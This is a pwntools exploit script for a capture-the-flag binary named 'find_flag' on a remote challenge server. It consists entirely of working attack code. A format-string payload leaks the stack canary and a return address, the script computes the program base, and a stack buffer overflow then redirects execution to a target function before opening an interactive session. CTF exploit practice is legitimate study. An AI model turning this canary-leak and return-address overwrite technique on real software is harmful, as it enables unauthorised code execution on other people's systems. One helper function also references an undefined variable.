from pwn import *
from LibcSearcher import *

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# p = remote("node4.buuoj.cn", 28576)
io = remote("node4.anna.nssctf.cn", 28380)
# io = process('./find_flag')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('find_flag')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    print(io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    p.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()


# context(os='linux', arch='amd64')
context(os='linux', arch = 'amd64', log_level = "debug")

padding_fmt = 6
padding_buf = 0x40 - 8

payload1 = '%17$p..%19$p'
ru("Hi! What's your name?")
sl(payload1)
ru('Nice to meet you, 0x')
# print(rl())
# pause()
canary = int(io.recv(14), 16) * 0x100
print("canary = ", hex(canary))
ru("..")
vuln_ret_addr = int(ru("!")[-13:-1], 16)
print("vuln_ret_addr = ", hex(vuln_ret_addr))
base_addr = vuln_ret_addr - 0x146F
print("base_addr = ", hex(base_addr))
back_addr = base_addr + 0x0122E

payload2 = b'a' * (0x40 - 8) + p64(canary) + b'a' * 8 + p64(back_addr)
ru('Anything else? ')
sl(payload2)

inter()
